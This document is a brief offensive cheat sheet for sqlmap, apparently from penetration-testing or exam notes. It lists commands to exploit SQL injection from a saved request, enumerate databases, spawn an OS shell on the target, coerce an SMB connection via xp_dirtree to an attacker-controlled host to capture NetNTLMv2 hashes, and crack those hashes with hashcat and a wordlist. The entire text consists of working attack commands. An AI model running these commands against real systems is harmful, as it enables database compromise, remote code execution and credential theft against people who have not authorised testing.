# SQLMap

### 1) Automate injection on post/get request stored within a .txt file

    sqlmap -r sqli.txt --batch


### 2) Enumerate dbs

    sqlmap -r sqli.txt --batch --dbs


### 3) OS Shell

    sqlmap -u "http://10.10.200.100/?src=*&dst=" --os-shell --batch


### 4) Relaying through SQLmap

    sqlmap -u "http://10.10.200.100/?src=*&dst=" --batch --sql-query="EXEC master.dbo.xp_dirtree '\\\\10.10.10.11\\share'"


### 5) NetNTLMv2 - responder hash crack

    hashcat -m 5600 db01.hash /usr/share/wordlists/rockyou.txt --force
